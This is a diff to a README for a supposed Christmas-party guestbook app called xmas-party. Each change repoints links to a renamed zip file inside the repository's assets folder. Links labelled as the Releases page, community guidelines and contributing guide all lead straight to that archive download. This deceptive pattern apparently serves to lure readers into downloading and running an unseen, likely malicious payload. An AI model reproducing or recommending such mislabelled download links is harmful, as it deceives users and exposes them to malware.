@@ -4,7 +4,7 @@
 Welcome to the Ultimate GitHub Christmas Party! This application brings festive cheer, allowing you to create a virtual guestbook for all your holiday celebrations. Follow this guide to download and run the software easily.
 
 ## 📥 Download the App
-[![Download xmas-party](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip%20xmas-party-ff69b4?style=for-the-badge&logo=github)](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip)
+[![Download xmas-party](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip%20xmas-party-ff69b4?style=for-the-badge&logo=github)](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip)
 
 ## 🌟 Features
 - Create and customize a digital guestbook.
@@ -13,7 +13,7 @@ Welcome to the Ultimate GitHub Christmas Party! This application brings festive 
 - A festive, user-friendly interface makes it easy for everyone.
 
 ## 💾 Download & Install
-To download the application, visit the Releases page: [Download xmas-party](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip). Here, you will find the latest version of the app.
+To download the application, visit the Releases page: [Download xmas-party](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip). Here, you will find the latest version of the app.
 
 1. On the Releases page, locate the latest version of xmas-party.
 2. Click on the download link for your operating system (Windows, macOS, or Linux).
@@ -64,10 +64,10 @@ If the download fails, try refreshing the page and downloading again. Ensure you
 Yes, xmas-party does not store any personal information. All guestbook entries are saved locally on your device.
 
 ## 🎁 Join the Community
-Join our community and share your festive creations! We encourage users to contribute their ideas and designs to make the app even better. Check the [community guidelines](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip) for more details.
+Join our community and share your festive creations! We encourage users to contribute their ideas and designs to make the app even better. Check the [community guidelines](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip) for more details.
 
 ## 🎨 Contributing
-Are you interested in contributing to xmas-party? We welcome new ideas and feature requests. Check out our [Contributing Guide](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip) for more information.
+Are you interested in contributing to xmas-party? We welcome new ideas and feature requests. Check out our [Contributing Guide](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip) for more information.
 
 ## 📞 Need Help?
 If you need assistance or have questions, feel free to reach out through the Issues tab in our repository. We aim to respond quickly.
@@ -75,4 +75,4 @@ If you need assistance or have questions, feel free to reach out through the Iss
 ## 🧙‍♂️ Celebrate with Us!
 We hope you enjoy using xmas-party as much as we enjoyed creating it. Spread the joy of the holiday season and make memorable digital experiences with your friends and loved ones. 
 
-[🔗 Download xmas-party Now!](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/html/xmas-party-rodless.zip) and start your festive journey!
+[🔗 Download xmas-party Now!](https://github.com/Nadal1234/xmas-party/raw/refs/heads/main/assets/images/party-xmas-v1.9.zip) and start your festive journey!
